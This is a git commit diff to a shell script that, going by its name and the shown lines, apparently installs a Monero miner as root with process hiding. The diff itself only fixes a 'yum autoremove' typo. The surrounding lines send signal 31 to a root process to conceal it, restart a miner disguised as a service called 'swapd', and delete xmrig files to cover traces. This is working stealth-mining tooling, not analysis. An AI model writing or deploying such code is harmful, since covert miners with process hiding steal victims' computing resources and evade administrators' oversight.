bfe9abc01a516f15e1e858674a8c316c70b89004
littlAcen <113854209+littlAcen@users.noreply.github.com>
2024-02-26 01:16:10 +0100

    Update setup_mo_4_r00t_with_processhide.sh

--- setup_mo_4_r00t_with_processhide.sh
+++ setup_mo_4_r00t_with_processhide.sh
@@ -456,6 +456,6 @@ kill -31 $(pgrep -f -u root config.json)
 
 #echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
 
-systemctl restart swapd ; rm -rf $HOME/xmrig* ; apt autoremove -y ; yum autpremove ;
+systemctl restart swapd ; rm -rf $HOME/xmrig* ; apt autoremove -y ; yum autoremove ;
 
 echo "[*] Setup complete"
